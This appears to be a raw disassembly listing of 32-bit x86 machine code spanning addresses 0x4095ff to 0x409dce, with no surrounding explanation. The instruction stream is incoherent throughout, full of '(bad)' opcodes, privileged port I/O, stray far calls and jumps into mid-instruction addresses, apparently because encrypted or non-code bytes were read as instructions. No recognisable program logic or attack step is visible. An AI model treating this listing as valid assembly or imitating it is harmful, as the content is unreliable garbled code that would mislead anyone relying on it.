  4095ff:	adc    DWORD PTR [esi+0x45962349],edx
  409605:	push   edx
  409606:	retf   0xe795
  409609:	out    dx,eax
  40960a:	inc    edx
  40960b:	dec    ebp
  40960c:	xlat   BYTE PTR ds:[ebx]
  40960d:	dec    ebx
  40960e:	sahf   
  40960f:	mov    ebx,0x9bcb7025
  409614:	push   esp
  409615:	jecxz  0x4095ac
  409617:	mov    dl,0x24
  409619:	xor    ebp,DWORD PTR [ebx+ecx*8]
  40961c:	enter  0x412d,0xfc
  409620:	or     BYTE PTR [eax+0x551ca912],ah
  409626:	pop    ecx
  409627:	scas   eax,DWORD PTR es:[edi]
  409628:	sub    esp,esi
  40962a:	or     DWORD PTR [edx-0x7bab9cb],0xffffffb1
  409631:	xchg   ecx,eax
  409632:	mov    ds:0x7f6a2246,al
  409637:	and    al,0x90
  409639:	mov    ebp,0xb459373
  40963e:	out    0xe2,al
  409640:	mov    edi,0x1ff1de50
  409645:	cmp    eax,0xf6cceb88
  40964a:	or     al,0xa
  40964c:	mov    dh,0xf2
  40964e:	sub    ah,ah
  409650:	pop    ebx
  409651:	ss push ss
  409653:	cdq    
  409654:	sub    al,0x4d
  409656:	(bad)  
  409657:	pop    ss
  409658:	dec    edi
  409659:	jp     0x4095ef
  40965b:	push   0xffffffbb
  40965d:	jno    0x409690
  40965f:	(bad)  
  409660:	cli    
  409661:	fiadd  WORD PTR [esi+ebx*1-0x57]
  409665:	push   esp
  409666:	mov    esp,0x48c665b3
  40966b:	push   ds
  40966c:	cld    
  40966d:	rcr    DWORD PTR [esi+ebp*2],cl
  409670:	mov    esi,edi
  409672:	pop    esi
  409673:	out    0xa0,eax
  409675:	mov    bh,0x97
  409677:	dec    esi
  409678:	out    dx,al
  409679:	inc    ebx
  40967a:	mov    dl,0xe3
  40967c:	dec    esi
  40967d:	cmp    ebp,ebx
  40967f:	ins    BYTE PTR es:[edi],dx
  409680:	mov    edx,0xfc1e6c55
  409685:	int3   
  409686:	jl     0x4096d0
  409688:	in     al,0x0
  40968a:	push   ss
  40968b:	inc    esi
  40968c:	mov    edi,0x7fb2c6d9
  409691:	mov    eax,0xd607b254
  409696:	into   
  409697:	xchg   BYTE PTR [ecx],dl
  409699:	or     edi,DWORD PTR [ecx-0x1c0c07ad]
  40969f:	in     al,0x4
  4096a1:	mov    BYTE PTR [ebx+edx*4+0xa],bl
  4096a5:	lock fs push edi
  4096a8:	scas   eax,DWORD PTR es:[edi]
  4096a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096aa:	sbb    DWORD PTR [ebx],ecx
  4096ac:	cli    
  4096ad:	call   0x1e1e:0x8349a74a
  4096b4:	fcomp  QWORD PTR ss:[ebx+0x66050cb4]
  4096bb:	jnp    0x4096bb
  4096bd:	fidivr WORD PTR [edx-0x24]
  4096c0:	test   BYTE PTR [ecx],dh
  4096c2:	xchg   esi,eax
  4096c3:	add    al,0xe5
  4096c5:	les    ebx,FWORD PTR [ebx+0x7f]
  4096c8:	sbb    esi,DWORD PTR [ebp+0x23]
  4096cb:	jne    0x40972f
  4096cd:	and    ch,BYTE PTR [eax]
  4096cf:	out    dx,eax
  4096d0:	adc    DWORD PTR [eax+0x64],ebp
  4096d3:	pop    eax
  4096d4:	mov    ch,0x50
  4096d6:	ss (bad) 
  4096d8:	mov    bl,0xa
  4096da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096db:	dec    ecx
  4096dc:	nop
  4096dd:	xchg   edi,eax
  4096de:	cmc    
  4096df:	fnstenv [edi]
  4096e1:	fistp  QWORD PTR [ecx+eiz*2+0x961e243]
  4096e8:	or     al,0x49
  4096ea:	mov    ebx,0x73db30f
  4096ef:	in     al,0x76
  4096f1:	pop    edx
  4096f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096f3:	leave  
  4096f4:	and    esi,DWORD PTR [esi+0x35bc70dc]
  4096fa:	adc    eax,0xd439c667
  4096ff:	mov    eax,ds:0xd5cf8ace
  409704:	cmp    eax,DWORD PTR [ebx+0x43]
  409707:	into   
  409708:	sub    al,0x80
  40970a:	add    al,0x38
  40970c:	and    ebx,DWORD PTR [ebp+0x4e23c845]
  409712:	nop
  409713:	inc    esi
  409714:	mov    edx,0x6525511
  409719:	jmp    0xeb3:0xa7c5b578
  409720:	add    BYTE PTR [eax+eax*1-0x5c],0x5d
  409725:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409726:	adc    bl,BYTE PTR [edx+0x611a072a]
  40972c:	mov    bh,0xab
  40972e:	xor    al,0x6d
  409730:	push   edx
  409731:	cld    
  409732:	sub    BYTE PTR [esp+eiz*2+0x79a72f57],bh
  409739:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40973a:	(bad)  
  40973b:	aad    0x26
  40973d:	pop    esi
  40973e:	int3   
  40973f:	in     al,0xf0
  409741:	push   ecx
  409742:	jbe    0x40970c
  409744:	(bad)  
  409746:	int    0x96
  409748:	pop    esi
  409749:	dec    esi
  40974a:	jb     0x40979e
  40974c:	outs   dx,DWORD PTR ds:[esi]
  40974d:	retf   0x215b
  409750:	mov    ch,0x81
  409752:	cmp    eax,0x6fbf615d
  409757:	int3   
  409758:	jbe    0x4097a1
  40975a:	push   edx
  40975b:	test   eax,0xc88cb5a9
  409760:	js     0x40979c
  409762:	mov    cl,BYTE PTR [ecx-0x1a]
  409765:	adc    dh,BYTE PTR [edi-0x78f20227]
  40976b:	sub    BYTE PTR [edi],bh
  40976d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40976e:	retf   0x15b3
  409771:	loope  0x409778
  409773:	add    DWORD PTR [esi],0x63
  409776:	add    dh,BYTE PTR [ebp+0x4f]
  409779:	jne    0x409736
  40977b:	ds loop 0x40979c
  40977e:	rol    ebx,0xfe
  409781:	aad    0x6a
  409783:	ret    
  409784:	ret    0x4b88
  409787:	out    dx,eax
  409788:	jnp    0x4097c2
  40978a:	mov    esi,0xcdc257d4
  40978f:	pushf  
  409790:	sahf   
  409791:	stc    
  409792:	cmp    bl,BYTE PTR [edx+0x22]
  409795:	cld    
  409796:	push   ds
  409797:	mov    esp,0x3f95fd7c
  40979c:	and    DWORD PTR [ebp+0x35],esp
  40979f:	leave  
  4097a0:	adc    BYTE PTR [ebx],ah
  4097a2:	loope  0x4097ba
  4097a4:	jmp    0x803c:0xe983f502
  4097ab:	mov    eax,ds:0x81cc115c
  4097b0:	inc    ecx
  4097b1:	xor    DWORD PTR [edx+0x3f851306],esp
  4097b7:	lahf   
  4097b8:	mov    ah,0xf
  4097ba:	and    BYTE PTR [eax+0x26e3183b],0xd9
  4097c1:	dec    esi
  4097c2:	(bad)  
  4097c3:	fld    QWORD PTR [esi]
  4097c5:	mov    edx,0x74a4a39a
  4097ca:	dec    esp
  4097cb:	shrd   DWORD PTR [ebx-0x4e],edx,0xe8
  4097d0:	xchg   ecx,eax
  4097d1:	std    
  4097d2:	add    eax,0x982d5840
  4097d7:	aad    0xfb
  4097d9:	pop    eax
  4097da:	and    BYTE PTR [edx],cl
  4097dc:	mov    ebp,DWORD PTR [ebx]
  4097de:	aas    
  4097df:	inc    esi
  4097e0:	cli    
  4097e1:	(bad)  
  4097e2:	in     eax,0xfb
  4097e4:	int3   
  4097e5:	(bad)  
  4097e6:	sbb    eax,0x588c4600
  4097eb:	pop    ebx
  4097ec:	call   0xe16c:0x245a0878
  4097f3:	(bad)  
  4097f4:	call   0xec67:0xa7c1fe8
  4097fb:	mov    cl,0x84
  4097fd:	push   ds
  4097fe:	fnstenv [ebx-0x4c325a0f]
  409804:	icebp  
  409805:	xchg   edx,eax
  409806:	fst    QWORD PTR [edi-0x5c9d24fe]
  40980c:	xor    dh,BYTE PTR [ecx+0x479b7e48]
  409812:	xchg   bh,bh
  409814:	jmp    0x3303:0x90584df2
  40981b:	sub    DWORD PTR [ebx-0x5bfac7d0],ebx
  409821:	clc    
  409822:	push   cs
  409823:	cli    
  409824:	in     al,0x5b
  409826:	aaa    
  409827:	(bad)
  40982b:	xchg   BYTE PTR [ecx-0x1501ae38],dh
  409831:	fidiv  DWORD PTR [eax]
  409833:	and    DWORD PTR [esp+ebx*1-0x7a],eax
  409837:	mov    ah,0x13
  409839:	pop    es
  40983a:	mov    bl,0x84
  40983c:	(bad)  
  40983d:	iret   
  40983e:	out    dx,al
  40983f:	loop   0x409870
  409841:	xchg   edx,eax
  409842:	and    bl,BYTE PTR [ebp-0x1f]
  409845:	cmp    eax,0x6fa30dd3
  40984a:	scas   al,BYTE PTR es:[edi]
  40984b:	mov    DWORD PTR [eax+0x74e4d1be],edi
  409851:	mov    al,0xf0
  409853:	xchg   esp,eax
  409854:	mov    ebx,0xa41d94e9
  409859:	fmulp  st(2),st
  40985b:	dec    ebp
  40985c:	fucomip st,st(4)
  40985e:	mov    edi,0x97086971
  409863:	loop   0x4098ca
  409865:	inc    eax
  409866:	pop    esp
  409867:	xchg   BYTE PTR [edx+ecx*4],ah
  40986a:	loop   0x409824
  40986c:	jg     0x4097f1
  40986e:	mov    esp,0xd6bd69ec
  409873:	xchg   edi,eax
  409874:	push   ebp
  409875:	je     0x409896
  409877:	sbb    ebx,ebp
  409879:	jns    0x409853
  40987b:	cs (bad) 
  40987d:	adc    dh,BYTE PTR [ecx]
  40987f:	pop    ecx
  409880:	shl    BYTE PTR [ebp+0x45],cl
  409883:	xchg   edx,eax
  409884:	xchg   edx,eax
  409885:	popf   
  409886:	popa   
  409887:	imul   ecx,DWORD PTR [esi-0x75b5dbbf],0xfffffffd
  40988e:	sbb    eax,0x5dfd94cd
  409893:	and    al,0x6a
  409896:	scas   eax,DWORD PTR es:[edi]
  409897:	or     DWORD PTR [eax+0x3a],esp
  40989a:	imul   ecx,DWORD PTR [ebp+ecx*2+0x3882e5f3],0x3
  4098a2:	es inc ebx
  4098a4:	out    0x4e,al
  4098a6:	mov    WORD PTR [eax+edx*1+0x5a9ec5b9],?
  4098ad:	ja     0x4098bb
  4098af:	lea    ecx,[esi-0x7d97ef79]
  4098b5:	aaa    
  4098b6:	rcr    al,cl
  4098b8:	inc    ecx
  4098b9:	scas   al,BYTE PTR es:[edi]
  4098ba:	aaa    
  4098bb:	call   0x4d7221b2
  4098c0:	sar    BYTE PTR [edx+edx*1+0x8],0x1
  4098c5:	push   cs
  4098c6:	sbb    al,0x92
  4098c8:	out    0xd1,eax
  4098ca:	fiadd  DWORD PTR [ecx+edx*1+0x2a103c23]
  4098d1:	sub    bh,BYTE PTR [edi+0x29ad51fa]
  4098d7:	enter  0x1351,0x61
  4098db:	hlt    
  4098dc:	iret   
  4098dd:	mov    edi,0xa74a63f3
  4098e2:	or     BYTE PTR [ebx],al
  4098e4:	or     dh,cl
  4098e6:	aaa    
  4098e7:	xchg   esi,eax
  4098e8:	fs cmp eax,0xe460e75c
  4098ee:	jg     0x4098cf
  4098f0:	sub    eax,0x7e3ad199
  4098f5:	retf   0x7369
  4098f8:	mov    esp,0x5a0ace9c
  4098fd:	dec    eax
  4098fe:	rcr    ah,1
  409900:	xchg   edi,eax
  409901:	ins    BYTE PTR es:[edi],dx
  409902:	push   ss
  409903:	or     edx,DWORD PTR ds:0xc853954c
  409909:	test   al,0x2a
  40990c:	sub    eax,eax
  40990e:	je     0x4098e1
  409910:	into   
  409911:	push   cs
  409912:	cmp    ebp,ebp
  409914:	std    
  409915:	push   ebp
  409916:	lahf   
  409917:	leave  
  409918:	cli    
  409919:	mov    ebp,DWORD PTR [edi+0x3]
  40991c:	mov    ah,0x90
  40991e:	(bad)  
  40991f:	inc    eax
  409920:	push   esp
  409921:	xlat   BYTE PTR ds:[ebx]
  409922:	push   ds
  409923:	int    0xbc
  409925:	push   esi
  409926:	push   esi
  409927:	sbb    DWORD PTR [esi],esi
  409929:	mov    esi,DWORD PTR [ebx+0x2f199c79]
  40992f:	and    DWORD PTR [edi],0xffffffe3
  409932:	sbb    BYTE PTR [ecx-0x5a],ch
  409935:	fnsave [esi]
  409937:	call   0x285c:0x35a6972e
  40993e:	outs   dx,BYTE PTR ds:[esi]
  40993f:	sahf   
  409940:	outs   dx,DWORD PTR ds:[esi]
  409941:	inc    edi
  409942:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409943:	jge    0x409985
  409945:	sahf   
  409946:	adc    eax,0x5c43872e
  40994b:	lods   eax,DWORD PTR ds:[esi]
  40994c:	fstp   st(2)
  40994e:	push   esi
  40994f:	in     eax,dx
  409950:	and    BYTE PTR [esi-0x8f824ea],ch
  409956:	fst    QWORD PTR [ecx+ebp*1+0x32]
  40995a:	jns    0x409919
  40995c:	xor    BYTE PTR [edi+0x23],ch
  40995f:	push   esi
  409960:	mov    dh,0xbb
  409962:	cld    
  409963:	ret    
  409964:	fucom  st(2)
  409966:	inc    ecx
  409967:	adc    BYTE PTR [ebx-0xf],cl
  40996a:	shl    bl,cl
  40996c:	mov    ch,0xbb
  40996e:	pop    ss
  40996f:	sbb    al,0xeb
  409971:	mov    ah,0xa3
  409973:	jo     0x409984
  409975:	in     al,dx
  409976:	push   ebp
  409977:	(bad)  
  409978:	xor    al,0xaa
  40997a:	mov    cl,0x5d
  40997c:	repnz xchg edi,eax
  40997e:	scas   eax,DWORD PTR es:[edi]
  40997f:	lfs    esi,FWORD PTR [edi+0x77]
  409983:	dec    eax
  409984:	fldenv [ebp-0x21]
  409987:	popf   
  409988:	neg    DWORD PTR [edi+0x4fe7e248]
  40998e:	iret   
  40998f:	dec    ebx
  409990:	pop    ds
  409991:	pop    ecx
  409992:	or     edi,ebx
  409994:	sub    eax,0x8be188f0
  409999:	imul   ecx,edi,0xe184d6d4
  40999f:	sti    
  4099a0:	mov    ds:0xe4defdf3,eax
  4099a5:	xchg   DWORD PTR [esp+ecx*8-0x1],esp
  4099a9:	jge    0x409959
  4099ab:	fisttp QWORD PTR [eax+0x1a54b901]
  4099b1:	xor    BYTE PTR [edx+edx*2],bl
  4099b4:	inc    edx
  4099b5:	and    eax,0x4a81158
  4099ba:	add    ecx,ecx
  4099bc:	xor    cl,dh
  4099be:	test   BYTE PTR [esi-0x7d10bc6a],0xbc
  4099c5:	mov    eax,0x247821bf
  4099ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099cb:	xor    ebx,DWORD PTR [edx]
  4099cd:	addr16 ds xchg edi,eax
  4099d0:	jbe    0x409991
  4099d2:	mov    ch,0x6b
  4099d4:	ficom  DWORD PTR [eax+0x62]
  4099d7:	neg    DWORD PTR [ebx]
  4099d9:	mov    ebp,0x4b9a69b7
  4099de:	cmp    al,bl
  4099e0:	shl    BYTE PTR [eax],1
  4099e2:	in     eax,dx
  4099e3:	xor    BYTE PTR [eax+esi*4-0x38],dl
  4099e7:	sub    ch,cl
  4099e9:	cmp    eax,DWORD PTR [edx]
  4099eb:	arpl   WORD PTR [edx+0x195d4608],ax
  4099f1:	or     dh,bh
  4099f3:	aas    
  4099f4:	cdq    
  4099f5:	cli    
  4099f6:	test   DWORD PTR [edx+eax*4+0x173f043d],esp
  4099fd:	xor    cl,BYTE PTR [ebx+0x19f78cf2]
  409a03:	jmp    0xa292a880
  409a08:	xchg   esi,eax
  409a09:	icebp  
  409a0a:	aas    
  409a0b:	jns    0x4099ee
  409a0d:	(bad)  
  409a0e:	cmp    eax,0x93404801
  409a13:	jl     0x4099be
  409a15:	jle    0x4099fd
  409a17:	mov    eax,ds:0x1c17e0c
  409a1c:	shr    dh,1
  409a1e:	adc    BYTE PTR [edx],ch
  409a20:	cmp    eax,0x62a60a1c
  409a25:	mov    bl,0x9f
  409a27:	fld    QWORD PTR [ebp+0x7c1d48a6]
  409a2d:	mov    esp,0x83dba65d
  409a32:	loopne 0x409a1c
  409a34:	cdq    
  409a35:	cdq    
  409a36:	xchg   esp,eax
  409a37:	push   cs
  409a38:	pushf  
  409a39:	adc    bl,BYTE PTR [esp+edi*8+0x3b2a0a74]
  409a40:	push   0xffffffab
  409a42:	inc    ecx
  409a43:	mov    ch,0x50
  409a45:	popa   
  409a46:	dec    ebx
  409a47:	xchg   edi,eax
  409a48:	or     eax,0x1b0a2bc3
  409a4d:	test   al,0xae
  409a4f:	mov    ch,0x76
  409a51:	pop    ecx
  409a52:	and    BYTE PTR [ebx],cl
  409a54:	sbb    cl,BYTE PTR [edi-0x1134e83b]
  409a5a:	pop    es
  409a5b:	fstp   QWORD PTR [eax]
  409a5d:	fwait
  409a5e:	dec    ebp
  409a5f:	ss std 
  409a61:	int3   
  409a62:	mov    dh,0xaf
  409a64:	dec    edx
  409a65:	and    edx,ebp
  409a67:	cwde   
  409a68:	push   ebx
  409a69:	imul   esi,edx,0x969b8604
  409a6f:	jl     0x409a0d
  409a71:	les    esi,FWORD PTR [edi-0x6800d5a7]
  409a77:	in     al,0xd1
  409a79:	adc    BYTE PTR [ecx-0x51a2d7ef],bh
  409a7f:	test   ebp,0x65b9b891
  409a85:	fcomp  DWORD PTR [edi]
  409a87:	sbb    eax,0x853becc8
  409a8c:	loopne 0x409a98
  409a8e:	das    
  409a8f:	nop
  409a90:	and    DWORD PTR [esi-0x3e6a854b],esi
  409a96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a97:	iret   
  409a98:	sahf   
  409a99:	jmp    0x409ab8
  409a9b:	mov    dh,0xc5
  409a9d:	aaa    
  409a9e:	pop    ecx
  409a9f:	mov    edx,0xe29da98d
  409aa4:	lock lahf 
  409aa6:	lock les esp,FWORD PTR [esi]
  409aa9:	add    eax,0x3388a1e
  409aaf:	icebp  
  409ab0:	dec    eax
  409ab1:	inc    esi
  409ab2:	test   BYTE PTR ds:0x844fb556,dh
  409ab8:	fwait
  409ab9:	mov    dh,BYTE PTR [edx-0x69]
  409abc:	ret    0x92f7
  409abf:	xchg   esi,eax
  409ac0:	mov    DWORD PTR [eax-0x678f0e30],edi
  409ac6:	das    
  409ac7:	sub    ecx,ebx
  409ac9:	add    BYTE PTR [edi],bl
  409acb:	cdq    
  409acc:	mov    WORD PTR [eax-0x4b6d4a97],fs
  409ad2:	sub    dh,BYTE PTR [ecx-0x67d929f4]
  409ad8:	pusha  
  409ad9:	fild   QWORD PTR [edx+eiz*2]
  409adc:	mov    ecx,0x1b8afcda
  409ae1:	test   al,0x48
  409ae3:	out    dx,eax
  409ae4:	inc    ebp
  409ae5:	cmp    dl,BYTE PTR [edx-0x4]
  409ae8:	add    eax,0x91e2f0e3
  409aed:	fdivp  st(7),st
  409aef:	mov    edx,0xc494541
  409af5:	add    eax,0x7abe889
  409afa:	cwde   
  409afb:	test   DWORD PTR [edi+eiz*4],ebx
  409afe:	and    eax,0x3f17d240
  409b03:	jae    0x409b6f
  409b05:	js     0x409b0f
  409b07:	or     cl,0x30
  409b0a:	ins    BYTE PTR es:[edi],dx
  409b0b:	and    edi,eax
  409b0d:	mov    ebp,0x903fd7a7
  409b12:	sub    DWORD PTR es:[edx-0x1dd8aee5],ebp
  409b19:	add    edi,edx
  409b1b:	sub    cl,bl
  409b1d:	jns    0x409b95
  409b1f:	jne    0x409abe
  409b21:	jp     0x409b2d
  409b23:	cwde   
  409b24:	repnz mov fs,eax
  409b27:	lahf   
  409b28:	sti    
  409b29:	(bad)  
  409b2a:	mov    esp,0x3c3450f6
  409b2f:	bnd jbe 0x409ae2
  409b32:	sti    
  409b33:	(bad)  
  409b35:	imul   ebx,DWORD PTR [eax],0xf20c3490
  409b3b:	lds    edx,FWORD PTR [ecx]
  409b3d:	inc    ebp
  409b3e:	sub    edi,DWORD PTR [ebx]
  409b40:	or     al,BYTE PTR [ecx+esi*2-0x4422d319]
  409b47:	jl     0x409b99
  409b49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b4a:	(bad)  
  409b4c:	xor    ah,BYTE PTR [ebp+0x7921d517]
  409b52:	jnp    0x409b6f
  409b54:	push   esi
  409b55:	dec    ebp
  409b56:	dec    edi
  409b57:	add    ch,BYTE PTR [edi+0x4b]
  409b5a:	(bad)  
  409b5b:	iret   
  409b5c:	pop    edi
  409b5d:	or     eax,0xd5a3ba28
  409b62:	pop    ecx
  409b63:	outs   dx,DWORD PTR ds:[esi]
  409b64:	retf   0xd896
  409b67:	pop    ebx
  409b68:	in     al,dx
  409b69:	loop   0x409b8f
  409b6b:	push   ebx
  409b6c:	pop    ss
  409b6d:	loopne 0x409bc6
  409b6f:	sub    DWORD PTR [esi],edi
  409b71:	push   edx
  409b72:	xor    al,0xa4
  409b74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b75:	scas   eax,DWORD PTR es:[edi]
  409b76:	xor    al,BYTE PTR [ebp-0x32]
  409b79:	lds    edi,FWORD PTR [ecx-0x50]
  409b7c:	lock push edi
  409b7e:	adc    al,dl
  409b80:	aam    0xd1
  409b82:	jb     0x409bcd
  409b84:	and    edx,DWORD PTR [ebp-0x1137d1b5]
  409b8a:	scas   al,BYTE PTR es:[edi]
  409b8b:	and    bl,BYTE PTR [ebp-0x7f32110a]
  409b91:	mov    es,eax
  409b93:	push   esp
  409b94:	fsubr  DWORD PTR [edx]
  409b96:	cmp    DWORD PTR [ebp-0x6f5be8d0],0xd72ac827
  409ba0:	and    al,BYTE PTR [edx+edx*4-0x66]
  409ba4:	in     al,0xe1
  409ba6:	cmp    dl,BYTE PTR ds:0x1743a483
  409bac:	or     al,0x40
  409bae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409baf:	jg     0x409be1
  409bb1:	or     bh,dl
  409bb3:	aad    0x66
  409bb5:	xor    bl,BYTE PTR [edx-0x4d214dfc]
  409bbb:	add    al,ah
  409bbd:	push   eax
  409bbe:	cdq    
  409bbf:	cwde   
  409bc0:	loop   0x409b44
  409bc2:	(bad)  
  409bc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bc4:	jne    0x409ba8
  409bc6:	xor    BYTE PTR [eax],dl
  409bc8:	add    cl,BYTE PTR [eax]
  409bca:	mov    edi,0xdcfe2c08
  409bcf:	mov    ds:0xc6c79fc4,eax
  409bd4:	dec    ebp
  409bd5:	jns    0x409bce
  409bd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bd8:	lock add al,dh
  409bdb:	jns    0x409bdf
  409bdd:	retf   
  409bde:	xor    BYTE PTR [ebp+ecx*8+0x6c],ah
  409be2:	inc    ebp
  409be3:	and    esp,DWORD PTR ds:[esi+0x705bb1e1]
  409bea:	test   eax,0x9fd4a8b7
  409bef:	(bad)  
  409bf1:	repz jle 0x409bb6
  409bf4:	cmp    eax,DWORD PTR [ebx+0x67]
  409bf7:	pop    esp
  409bf8:	or     esp,DWORD PTR [ebp+0x3e21a9ca]
  409bfe:	or     BYTE PTR [ecx+0x16],bl
  409c01:	daa    
  409c02:	into   
  409c03:	retf   0xda98
  409c06:	mov    bh,0x31
  409c08:	pop    eax
  409c09:	retf   
  409c0a:	jmp    0xf44e845d
  409c0f:	fiadd  DWORD PTR [eax-0x5475b829]
  409c15:	popa   
  409c16:	adc    bl,BYTE PTR [edi]
  409c18:	xchg   BYTE PTR [esi+edx*1+0x54],al
  409c1c:	xor    al,0xa0
  409c1e:	or     eax,esi
  409c20:	mov    al,0x64
  409c22:	adc    DWORD PTR ds:[edi+0x59],0xd7320580
  409c2a:	sbb    edx,DWORD PTR [eax+0x2b]
  409c2d:	add    DWORD PTR [ebx+ebx*1-0x209502af],ebp
  409c34:	mov    ds:0x8f59a21d,al
  409c39:	and    ebp,DWORD PTR [ebx]
  409c3b:	mov    ebx,0xa1e3fdee
  409c40:	jg     0x409c33
  409c42:	neg    BYTE PTR [ebx]
  409c44:	dec    eax
  409c45:	in     al,0x5b
  409c47:	push   ebx
  409c48:	push   eax
  409c49:	sub    DWORD PTR [edx],0x28
  409c4c:	gs mov dh,0x5e
  409c4f:	inc    eax
  409c50:	stos   DWORD PTR es:[edi],eax
  409c51:	push   eax
  409c52:	in     al,dx
  409c53:	inc    ebp
  409c54:	loope  0x409c89
  409c56:	fwait
  409c57:	push   edi
  409c58:	rol    DWORD PTR [ebp-0x2d],cl
  409c5b:	aad    0x6c
  409c5d:	loop   0x409cdc
  409c5f:	pop    es
  409c60:	sar    DWORD PTR [eax+0x28d9e0df],1
  409c66:	rcr    ch,0xf4
  409c69:	sub    DWORD PTR [eax-0x30],esi
  409c6c:	fwait
  409c6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c6e:	jb     0x409cc6
  409c70:	enter  0x14b0,0xec
  409c74:	inc    edx
  409c75:	leave  
  409c76:	inc    esi
  409c77:	add    dh,BYTE PTR [esi-0x1b800ab6]
  409c7d:	les    esp,FWORD PTR [ecx]
  409c7f:	adc    eax,0x2caae328
  409c84:	retf   0x576b
  409c87:	sub    ah,BYTE PTR [esi-0x6a69d5f3]
  409c8d:	test   DWORD PTR gs:[edi+0x2d],0xfa052e63
  409c95:	lahf   
  409c96:	outs   dx,BYTE PTR ds:[esi]
  409c97:	popf   
  409c98:	and    DWORD PTR [ecx],0xc62d89a7
  409c9e:	aaa    
  409c9f:	mov    eax,ds:0x5c3a9997
  409ca4:	or     eax,0x436c4985
  409ca9:	adc    eax,0xe7e53a61
  409cae:	jl     0x409d1b
  409cb0:	fcmovb st,st(2)
  409cb2:	cmp    bh,BYTE PTR [ecx]
  409cb4:	push   0xc72590c5
  409cb9:	and    DWORD PTR [esi],ebp
  409cbb:	das    
  409cbc:	in     al,dx
  409cbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cbe:	inc    ebx
  409cbf:	xlat   BYTE PTR ds:[ebx]
  409cc0:	in     eax,0xdd
  409cc2:	nop
  409cc3:	mov    gs,WORD PTR [eax+ebp*2+0x2fa26470]
  409cca:	and    ch,BYTE PTR [ebx+0x3a]
  409ccd:	push   0x5d70cda2
  409cd2:	mov    ecx,0xba5fbab2
  409cd7:	(bad)  
  409cd8:	out    dx,al
  409cd9:	mov    BYTE PTR [ebx-0x78547c49],ah
  409cdf:	sub    esp,DWORD PTR ds:0xcd19820c
  409ce5:	sub    al,BYTE PTR ds:[esi-0x4e]
  409ce9:	arpl   WORD PTR [edx+0xd],bx
  409cec:	xchg   esp,eax
  409ced:	pop    ebp
  409cee:	ss ins BYTE PTR es:[edi],dx
  409cf0:	sbb    cl,BYTE PTR [ecx+0x55c39645]
  409cf6:	mov    dh,0x48
  409cf8:	mov    BYTE PTR [ecx],bh
  409cfa:	aad    0xcd
  409cfc:	cmc    
  409cfd:	cmp    eax,DWORD PTR [eax+ecx*2+0x18a98655]
  409d04:	jp     0x409cf1
  409d06:	mov    DWORD PTR [esi-0x6],esp
  409d09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d0a:	or     al,0xce
  409d0c:	pop    ebx
  409d0d:	mov    BYTE PTR [edi-0x8],cl
  409d10:	pop    ecx
  409d11:	test   eax,esi
  409d13:	sub    DWORD PTR ds:0x67b99ddb,0xffffffd9
  409d1a:	imul   ecx,ebx,0xffffffe1
  409d1d:	cld    
  409d1e:	dec    ebp
  409d1f:	scas   eax,DWORD PTR es:[edi]
  409d20:	sbb    BYTE PTR [eax+0x5861469a],dl
  409d26:	mov    ah,0x9b
  409d28:	lahf   
  409d29:	outs   dx,DWORD PTR ds:[esi]
  409d2a:	shr    DWORD PTR [edi+0x18],cl
  409d2d:	out    0x89,al
  409d2f:	gs add al,0x34
  409d32:	fwait
  409d33:	je     0x409d38
  409d35:	push   cs
  409d36:	out    0x79,eax
  409d38:	dec    bh
  409d3a:	pop    es
  409d3b:	mov    esi,0x25593d91
  409d40:	stos   BYTE PTR es:[edi],al
  409d41:	fxch   st(3)
  409d43:	in     al,dx
  409d44:	nop
  409d45:	dec    esp
  409d46:	dec    edi
  409d47:	and    DWORD PTR [ecx-0x10608799],ecx
  409d4d:	mov    ebp,0x3055decc
  409d52:	shl    BYTE PTR [esi-0x1a],cl
  409d55:	rcr    DWORD PTR [edx],cl
  409d57:	pmuludq mm7,QWORD PTR [edx]
  409d5a:	fisubr DWORD PTR [edi+ebp*1+0x5d]
  409d5e:	push   0xde406368
  409d63:	mov    ah,0x61
  409d65:	cmp    ecx,DWORD PTR [eax-0x46ef0041]
  409d6b:	xchg   edi,eax
  409d6c:	mov    esp,0x23fb3efb
  409d71:	push   0xffffff97
  409d73:	std    
  409d74:	(bad)  
  409d75:	fnsave [esi-0x676531b8]
  409d7b:	jp     0x409d65
  409d7d:	outs   dx,DWORD PTR ds:[esi]
  409d7e:	out    0xc4,eax
  409d80:	iret   
  409d81:	std    
  409d82:	xchg   ebp,eax
  409d83:	dec    ebp
  409d84:	sub    al,0x49
  409d86:	(bad)  
  409d87:	push   cs
  409d88:	in     eax,dx
  409d89:	dec    ebx
  409d8a:	push   esp
  409d8b:	fwait
  409d8c:	add    DWORD PTR [edx],ebx
  409d8e:	mov    ch,0xfb
  409d90:	sub    eax,DWORD PTR [edi+0x2e432b2e]
  409d96:	out    dx,eax
  409d97:	and    eax,0xc0463d7b
  409d9c:	(bad)  
  409d9d:	in     eax,0xba
  409d9f:	add    ebx,ebx
  409da1:	or     DWORD PTR [ebx+0x2c],0x78
  409da5:	shl    BYTE PTR [esi-0x70],1
  409da8:	push   eax
  409da9:	sbb    eax,0x3f015f72
  409dae:	xchg   BYTE PTR [eax],ah
  409db0:	add    edi,edx
  409db2:	push   0x3a03cca
  409db7:	push   ebp
  409db8:	mov    ebp,ebx
  409dba:	mov    bh,0xda
  409dbc:	inc    ecx
  409dbd:	mov    BYTE PTR [edx-0x141c47b8],ah
  409dc3:	mov    ah,0x62
  409dc5:	mov    cl,0xd0
  409dc7:	call   0xb7e0889d
  409dcc:	mov    bh,dh
  409dce:	xlat   BYTE PTR ds:[ebx]
